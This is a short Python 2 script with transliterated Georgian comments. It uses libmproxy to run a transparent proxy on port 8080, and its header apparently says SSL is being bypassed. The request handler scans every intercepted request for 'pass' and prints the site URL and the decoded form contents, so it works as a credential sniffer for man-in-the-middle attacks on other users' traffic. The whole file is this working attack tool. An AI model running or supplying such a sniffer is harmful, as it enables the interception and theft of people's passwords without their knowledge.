
# ssl is gayalbeba

#kodma rom imushaos unda iyos
#chawerili urllib da libmproxy bibliotekebi



import os, re, urllib
from libmproxy import controller, proxy
from libmproxy.proxy.server import ProxyServer


class Sniff(controller.Master):
    
    def run(self):
        '''
        pirvelad scripts gashvebis dros
        '''
        print 'gasatishad ixmare Ctrl+C'
        print
        try:
            return controller.Master.run(self)
        except KeyboardInterrupt:
            self.shutdown()

    def handle_request(self, flow):
        '''
        gaketebuli motxovnebis dros
        '''
        raw = str(flow.request.content) # motxovnis kontenti
        host= str(flow.request.url) # kontentis url
        if re.findall("pass", raw, re.I): # parsireba
            print '========================================================'
            print '\t\t\t' + host + '\n' # davbewdot saiti sadac moxda monacemebis gadagzavna
            print urllib.unquote(raw).decode('utf8') # davbewdot mteli konkenti gadagzavnili monacemebis
            print '========================================================'
            print
      
        flow.reply() # paketis gatareba

config = proxy.ProxyConfig(
    port=8080, # vusment 8080 ports
    mode="transparent" # vamushavbet transparent mode-ze
) 
server = ProxyServer(config)
m = Sniff(server)
m.run()
